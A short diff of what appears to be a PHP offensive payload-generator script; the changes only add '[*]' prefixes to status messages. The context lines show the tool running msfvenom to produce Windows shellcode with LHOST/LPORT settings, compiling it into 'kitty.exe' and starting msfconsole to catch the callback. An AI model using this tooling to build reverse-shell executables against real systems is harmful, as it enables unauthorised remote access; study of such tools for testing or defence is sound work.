@@ -186,7 +186,7 @@ function generate_shell(){
 	}else{
 	}
 	
-	echo "\n\e[91mGenerating Payload\e[0m . . .\n";
+	echo "[*] \n\e[91mGenerating Payload\e[0m . . .\n";
 	system("msfvenom -p {$lpayload} LHOST={$lhost} LPORT={$lport} --arch x86 --platform windows --smallest -f raw > raw_shellcode.txt");
 	$ascar = array();
 	$hxar = array();
@@ -301,7 +301,7 @@ if ($exe_arch == "32"){
     system("x86_64-w64-mingw32-gcc c_file_temp.c -o kitty.exe");
 }
 system("rm c_file_temp.c");
-echo "/kitty.exe created!\n\n";
+echo "[*] kitty.exe created!\n\n";
 echo "\e[101m\e[97mHappy Hack :)!\e[0m\n";
 
 }
@@ -445,7 +445,7 @@ echo "\n\e[101m\e[97mHappy Hack :)!\e[0m\n";
 	die("Unknown Format!\n");
 }
 if(file_exists("meta.rc")){
-		echo "Starting service postgresql . . . \n";
+		echo "[*] Starting service postgresql . . . \n";
 		system("service postgresql start");
 		system("msfconsole -r meta.rc");
 	}else{
